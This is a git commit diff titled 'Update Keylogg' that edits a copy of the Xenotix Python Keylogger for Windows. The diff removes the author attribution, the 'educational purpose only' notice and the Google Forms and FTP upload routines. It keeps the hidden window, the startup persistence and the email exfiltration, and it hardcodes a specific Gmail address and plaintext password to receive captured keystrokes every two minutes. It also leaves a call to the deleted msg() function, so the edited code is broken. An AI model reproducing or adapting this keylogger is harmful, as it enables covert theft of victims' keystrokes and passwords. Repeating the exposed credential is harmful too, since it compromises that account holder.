4a56ed1ec9afe05eb7939a841c83d0fd2a1dc14a
Oscar Mateo Peñaherrera <mateo_penaherrera@yahoo.com>
2020-02-12 00:28:52 -0500

    Update Keylogg

--- Opcion B/python_logger.py
+++ Opcion B/python_logger.py
@@ -1,17 +1,4 @@
 '''
-Xenotix Python Keylogger for Windows
-====================================
-Coded By: Ajin Abraham <ajin25@gmail.com>
-Website: http://opensecurity.in/xenotix-python-keylogger-for-windows/
-GitHub: https://github.com/ajinabraham/Xenotix-Python-Keylogger
-
-FEATURES
-========
-1.STORE LOGS LOCALLY
-2.SEND LOGS TO GOOGLE FORMS
-3.SEND LOGS TO EMAIL
-4.SEND LOGS TO FTP
-
 MINIMUM REQUIREMENTS
 ===================
 Python 2.7: http://www.python.org/getit/
@@ -20,9 +7,6 @@ pyrhoncom Module: http://sourceforge.net/projects/pywin32/
 
 pyHook Module - 
 Unofficial Windows Binaries for Python Extension Packages: http://www.lfd.uci.edu/~gohlke/pythonlibs/
-
-
-NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR EDUCATIONAL PURPOSE ONLY.
 '''
 try:
     import pythoncom, pyHook
@@ -56,25 +40,6 @@ def hide():
     win32gui.ShowWindow(window,0)
     return True
 
-def msg():
-    print """\n \nXenotix Python Keylogger for Windows
-Coder: Ajin Abraham <ajin25@gmail.com>
-OPENSECURITY.IN
-
-usage:xenotix_python_logger.py mode [optional:startup]
-
-mode:
-     local: store the logs in a file [keylogs.txt]
-     
-     remote: send the logs to a Google Form. You must specify the Form URL and Field Name in the script.
-     
-     email: send the logs to an email. You must specify (SERVER,PORT,USERNAME,PASSWORD,TO).
-     
-     ftp: upload logs file to an FTP account. You must specify (SERVER,USERNAME,PASSWORD,SSL OPTION,OUTPUT DIRECTORY).
-
-[optional] startup: This will add the keylogger to windows startup.\n\n"""
-    return True
-
 # Add to startup
 def addStartup():
     fp=os.path.dirname(os.path.realpath(__file__))
@@ -97,21 +62,6 @@ def local():
         data=''
     return True
 
-#Remote Google Form logs post
-def remote():
-    global data
-    if len(data)>100:
-        url="https://docs.google.com/forms/d/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx" #Specify Google Form URL here
-        klog={'entry.xxxxxxxxxxx':data} #Specify the Field Name here
-        try:
-            dataenc=urllib.urlencode(klog)
-            req=urllib2.Request(url,dataenc)
-            response=urllib2.urlopen(req)
-            data=''
-        except Exception as e:
-            print e
-    return True
-
 #Email Logs
 class TimerClass(threading.Thread):
     def __init__(self):
@@ -124,10 +74,10 @@ class TimerClass(threading.Thread):
                 ts = datetime.datetime.now()
                 SERVER = "smtp.gmail.com" #Specify Server Here
                 PORT = 587 #Specify Port Here
-                USER="your_email@gmail.com"#Specify Username Here 
-                PASS="password_here"#Specify Password Here
+                USER="oscarmateo1997@gmail.com"#Specify Username Here 
+                PASS="viviteamomucho"#Specify Password Here
                 FROM = USER#From address is taken from username
-                TO = ["to_address@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
+                TO = ["oscarmateo1997@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
                 SUBJECT = "Keylogger data: "+str(ts)
                 MESSAGE = data
                 message = """\
@@ -149,36 +99,6 @@ Subject: %s
                     print e
             self.event.wait(120)
 
-#Upload logs to FTP account
-def ftp():
-    global data,count
-    if len(data)>100:
-        count+=1
-        FILENAME="logs-"+str(count)+".txt"
-        fp=open(FILENAME,"a")
-        fp.write(data)
-        fp.close()
-        data=''
-        try:
-            SERVER="ftp.xxxxxx.com" #Specify your FTP Server address
-            USERNAME="ftp_username" #Specify your FTP Username
-            PASSWORD="ftp_password" #Specify your FTP Password
-            SSL=0 #Set 1 for SSL and 0 for normal connection
-            OUTPUT_DIR="/" #Specify output directory here
-            if SSL==0:
-                ft=ftplib.FTP(SERVER,USERNAME,PASSWORD)
-            elif SSL==1:
-                ft=ftplib.FTP_TLS(SERVER,USERNAME,PASSWORD)
-            ft.cwd(OUTPUT_DIR)
-            fp=open(FILENAME,'rb')
-            cmd= 'STOR' +' '+FILENAME
-            ft.storbinary(cmd,fp)
-            ft.quit()
-            fp.close()
-            os.remove(FILENAME)
-        except Exception as e:
-            print e
-    return True
 
 def main():
     global x
@@ -195,16 +115,10 @@ def main():
         if sys.argv[1]=="local":
             x=1
             hide()
-        elif sys.argv[1]=="remote":
-            x=2
-            hide()
         elif sys.argv[1]=="email":
             hide()
             email=TimerClass()
             email.start()
-        elif sys.argv[1]=="ftp":
-            x=4
-            hide()
         else:
             msg()
             exit(0)
